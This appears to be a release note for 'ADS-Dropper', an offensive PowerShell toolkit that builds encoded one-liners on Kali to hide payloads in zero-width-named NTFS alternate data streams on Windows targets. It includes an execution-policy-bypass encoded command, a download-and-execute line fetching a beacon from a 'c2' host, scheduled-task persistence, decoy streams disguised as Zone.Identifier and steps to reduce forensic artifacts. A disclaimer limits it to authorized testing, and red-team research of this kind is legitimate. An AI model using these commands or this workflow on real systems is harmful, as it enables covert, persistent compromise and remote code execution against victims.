# Refactoring Complete - Option C Hybrid Implementation

**Date:** January 29, 2026  
**Version:** 2.0.0 (Refactored)  
**Status:** ✅ Ready for Testing

---

## 🎯 What Changed

### Before (Multi-File Dependencies)
```
Repository/
├── src/
│   ├── ADS-Dropper.ps1 (requires external files)
│   ├── New-ZeroWidthStreamName.ps1
│   └── Invoke-ManifestTracking.ps1
├── defense/
└── tests/
```

**Problems:**
- ❌ Required full repo on Windows target
- ❌ External module dependencies
- ❌ No Linux → Windows workflow
- ❌ "New-" prefix naming confusion

### After (Option C Hybrid)
```
Repository/
├── src/
│   └── ADS-Dropper.ps1 (fully self-contained)
├── Build-ADSOneLiner.ps1 (Linux generator)
├── USAGE-GUIDE.md
├── manifests/ (Linux-only)
├── defense/ (unchanged)
└── tests/ (unchanged)
```

**Solutions:**
- ✅ Single file, no dependencies
- ✅ Linux generator → Windows one-liner
- ✅ Manifest saved to Linux only
- ✅ All "New-" renamed (Generate-, Create-, etc.)

---

## 📦 Deliverables

### 1. ADS-Dropper.ps1 (Consolidated)

**Location:** `src/ADS-Dropper.ps1`

**Key Changes:**
- All functions embedded (no `Import-Module` needed)
- Renamed functions:
  - `New-ZeroWidthStreamName` → `Generate-ZeroWidthStream`
  - `New-ManifestEntry` → `Create-ManifestEntry`
  - `New-DecoyStreams` → `Create-DecoyStreams`
  - `New-ADSPayload` → `Write-ADSPayload`
- Can run standalone on Windows
- Used as source by generator

**Usage:**
```powershell
# Direct use on Windows (if you have the file there)
.\ADS-Dropper.ps1 -Payload "IEX(...)" -ZeroWidthStreams -Persist task -Encrypt
```

---

### 2. Build-ADSOneLiner.ps1 (Generator)

**Location:** `Build-ADSOneLiner.ps1` (root level)

**Purpose:** Run on Linux (Kali) to generate Windows payloads

**Outputs:**
1. **Base64 one-liner** - Compact, ready to paste
2. **Readable multi-line** - For debugging, modification
3. **Manifest** - Saved to Linux (`./manifests/`) ONLY

**Usage:**
```bash
# On Linux (Kali)
pwsh Build-ADSOneLiner.ps1 \
  -Payload "IEX(...)" \
  -ZeroWidthMode single \
  -Persist task \
  -Encrypt \
  -CreateDecoys 3

# Creates:
# - ads-payload.txt (both formats)
# - manifests/manifest-TIMESTAMP.json
```

---

### 3. USAGE-GUIDE.md

**Location:** `USAGE-GUIDE.md`

**Contents:**
- Quick start (Linux → Windows workflow)
- Complete workflow examples
- Parameter reference
- Manifest structure
- Cleanup procedures
- Troubleshooting
- Best practices

---

## 🔄 Workflow

### Standard Operating Procedure

```
┌─────────────────────────────────────────────┐
│ STEP 1: Linux Machine (Kali)               │
├─────────────────────────────────────────────┤
│ pwsh Build-ADSOneLiner.ps1 \               │
│   -Payload "..." \                          │
│   -ZeroWidthMode single \                   │
│   -Persist task \                           │
│   -Encrypt                                  │
│                                             │
│ Output:                                     │
│  - ads-payload.txt                          │
│  - manifests/manifest-TIMESTAMP.json        │
└─────────────────────────────────────────────┘
                    │
                    │ (Copy-Paste)
                    ▼
┌─────────────────────────────────────────────┐
│ STEP 2: Windows Target                     │
├─────────────────────────────────────────────┤
│ Open PowerShell                             │
│ Paste OPTION 1 (base64 one-liner):         │
│                                             │
│ powershell.exe -EncodedCommand ...          │
│                                             │
│ Result:                                     │
│  - ADS created with zero-width name         │
│  - Persistence set (scheduled task)         │
│  - Payload executed                         │
└─────────────────────────────────────────────┘
                    │
                    │ (After Operation)
                    ▼
┌─────────────────────────────────────────────┐
│ STEP 3: Cleanup (Windows)                  │
├─────────────────────────────────────────────┤
│ Get codepoints from Linux manifest          │
│ Reconstruct stream name                     │
│ Remove ADS, task, host file                │
└─────────────────────────────────────────────┘
```

---

## ✨ Key Features

### 1. Payload Flexibility

**Option A: Baked-In (Generation Time)**
```bash
pwsh Build-ADSOneLiner.ps1 -Payload "IEX(...)"
```
- Payload embedded in one-liner
- Fully base64-encodable
- Best for known payloads

**Option B: Runtime (Deployment Time)**
```bash
pwsh Build-ADSOneLiner.ps1 -PayloadAtDeployment
```
- Prompts for payload on Windows target
- Cannot be fully base64-encoded
- Best for dynamic payloads

### 2. Dual Output Formats

Every generation creates:

**OPTION 1: Base64 One-Liner**
```powershell
powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand JABzAGMAcgBp...
```
- Compact
- Safe for transport
- Copy-paste ready

**OPTION 2: Readable Multi-Line**
```powershell
# Full PowerShell code visible
$script:ZWC = @(...)
function Generate-ZeroWidthStream { ... }
$hp='C:\ProgramData\SystemCache.dat'
...
```
- Human-readable
- Easy to modify
- Debugging-friendly

### 3. Linux-Only Manifests

**Critical:** Manifests never sent to Windows target

**Manifest Contents:**
```json
{
  "Codepoints": "U+200B",
  "HostPath": "C:\\ProgramData\\SystemCache.dat",
  "PayloadHash": "A3F5B2...",
  "Operator": "kali",
  "GeneratedOn": "attacker-machine",
  ...
}
```

**Recovery:**
```bash
# On Linux
cat manifests/manifest-*.json | jq '.Codepoints'

# On Windows
$sn = ConvertFrom-Codepoints -Codepoints '<from_manifest>'
Remove-Item "C:\ProgramData\SystemCache.dat:$sn" -Force
```

---

## 📊 Testing Checklist

### On Linux (Kali)

- [ ] PowerShell Core installed (`pwsh`)
- [ ] Build-ADSOneLiner.ps1 runs without errors
- [ ] Output file created (ads-payload.txt)
- [ ] Manifest created in ./manifests/
- [ ] Both formats present in output file
- [ ] Manifest contains correct codepoints

### On Windows VM (Lab)

- [ ] OPTION 1 (base64) executes successfully
- [ ] OPTION 2 (readable) executes successfully
- [ ] ADS created at specified path
- [ ] Zero-width stream invisible in `dir /r`
- [ ] Scheduled task created (if -Persist task)
- [ ] Payload executes
- [ ] Encryption works (if -Encrypt)
- [ ] Decoys created (if -CreateDecoys)

### Cleanup

- [ ] Stream name recovered from codepoints
- [ ] ADS removed successfully
- [ ] Scheduled task removed
- [ ] Host file removed
- [ ] No artifacts remaining

---

## 🔧 Common Usage Patterns

### Pattern 1: Silent Persistence

```bash
# Linux
pwsh Build-ADSOneLiner.ps1 \
  -Payload "IEX(New-Object Net.WebClient).DownloadString('http://c2/beacon')" \
  -ZeroWidthMode hybrid \
  -HybridPrefix "Zone.Identifier" \
  -CreateDecoys 3 \
  -Persist task \
  -Encrypt
```

**Result:** Looks like legitimate Zone.Identifier stream with decoys

### Pattern 2: One-Time Execution

```bash
# Linux
pwsh Build-ADSOneLiner.ps1 \
  -Payload "whoami; ipconfig; net user" \
  -Persist none
```

**Result:** Executes immediately, no persistence

### Pattern 3: Dynamic Payload

```bash
# Linux
pwsh Build-ADSOneLiner.ps1 \
  -PayloadAtDeployment \
  -ZeroWidthMode single \
  -Persist task

# Windows (will prompt)
# Enter payload: <paste_payload_here>
```

**Result:** Flexible deployment-time decision

---

## 🚨 Important Notes

### Naming Convention Changes

All "New-" prefixes removed to avoid iteration confusion:

| Old Name | New Name | Reason |
|----------|----------|--------|
| `New-ZeroWidthStreamName` | `Generate-ZeroWidthStream` | Clearer intent |
| `New-ManifestEntry` | `Create-ManifestEntry` | Consistency |
| `New-DecoyStreams` | `Create-DecoyStreams` | Consistency |
| `New-ADSPayload` | `Write-ADSPayload` | Describes action |
| `New-Loader` | `Build-Loader` | Describes action |

### Manifest Storage

**CRITICAL:** Manifests are stored on Linux operator machine ONLY.

**Why:**
- Smaller footprint on Windows target
- Easier recovery from centralized location
- Operator maintains control
- Reduces forensic artifacts on target

**Where:**
- Default: `./manifests/` (relative to generator script)
- Can be changed with `-ManifestDir` parameter
- Each deployment gets unique timestamped file

---

## 📝 Migration Guide

### If You Have Existing Deployments

**Old Workflow:**
1. Copy full repo to Windows
2. Run `ADS-Dropper.ps1` locally
3. Manually track stream names

**New Workflow:**
1. Generate on Linux with `Build-ADSOneLiner.ps1`
2. Copy-paste one-liner to Windows
3. Automatic manifest tracking on Linux

**Compatibility:**
- Old manual deployments still work
- Can use new generator for future deployments
- Manifests help with both new and old cleanup

---

## 🎓 Next Steps

### Immediate Actions

1. **Test the generator on Linux:**
   ```bash
   pwsh Build-ADSOneLiner.ps1 -Payload "Write-Host Test" -OutputFile test.txt
   ```

2. **Test deployment on Windows VM:**
   ```powershell
   # Paste OPTION 1 from test.txt
   ```

3. **Verify manifest creation:**
   ```bash
   cat manifests/manifest-*.json | jq
   ```

4. **Test cleanup procedure:**
   ```powershell
   # Use codepoints from manifest
   ```

### Future Enhancements

From your original wishlist (Option 3 ideas):

1. **Extended Unicode** - Bidirectional confusion, additional character sets
2. **Registry/WMI persistence** - Complete the persistence methods
3. **Enhanced obfuscation** - Multi-stage, time-based execution
4. **Cloud sync testing** - OneDrive/Google Drive behavior

---

## 🏁 Success Criteria

- [x] Single-file deployment (no dependencies)
- [x] Linux → Windows workflow
- [x] Both encoded and readable outputs
- [x] Manifest on Linux only
- [x] Payload at generation OR deployment
- [x] All "New-" prefixes removed
- [x] PowerShell-only (no Python)
- [x] Comprehensive documentation

**Status:** All criteria met! ✅

---

## 📞 Questions & Support

If you encounter issues:

1. Check `USAGE-GUIDE.md` for examples
2. Review manifest files for deployment details
3. Test in Windows VM before production
4. Keep manifests backed up

For questions about implementation:
- See `INTEGRATION-NOTES.md` for technical details
- See `BLUE-TEAM-GUIDE.md` for detection info

---

**Ready for deployment!** 🚀

Remember: This is for authorized security testing only. Always obtain proper permission before deploying.

© 2026 Qweary - Security Research With Purpose


